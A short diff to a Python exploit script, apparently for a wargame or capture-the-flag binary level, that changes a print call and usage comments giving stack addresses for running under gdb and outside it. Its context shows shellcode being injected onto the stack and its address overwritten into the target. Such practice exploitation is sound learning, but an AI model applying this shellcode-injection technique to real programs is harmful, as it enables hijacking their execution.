@@ -29,7 +29,7 @@ inject_shellcode_onto_stack = b"setstring 0 " + raw_shellcode + b"\n" # write sh
 
 
 string_injectable_shellcode_address = shellcode_address.to_bytes(8, byteorder='little') # convert the shellcode address to bytes to inject as string
-print(f"injecting: ", string_injectable_shellcode_address.hex(  ))
+print(f"injecting: ", string_injectable_shellcode_address.hex())
 # string_injectable_shellcode_address.rstrip(b"\x00")
 # print(f"length: ", len(string_injectable_shellcode_address))
 # string_injectable_shellcode_address += (8 - len(string_injectable_shellcode_address)) * b"A"
@@ -76,4 +76,6 @@ sys.stdout.buffer.write(output)
 
 # setstring 1 @UUUAAAA
 
-# python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008 | /levels/level10/level10
+# gdb: python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008 | ./level10
+# outside: python3 ~/level10.py 0x7fffffffe1b8 0x7ffffffde008 | ./level10
+# or python3 ~/level10.py 0x7fffffffe1c8 0x7ffffffde008 | /levels/level10/level10
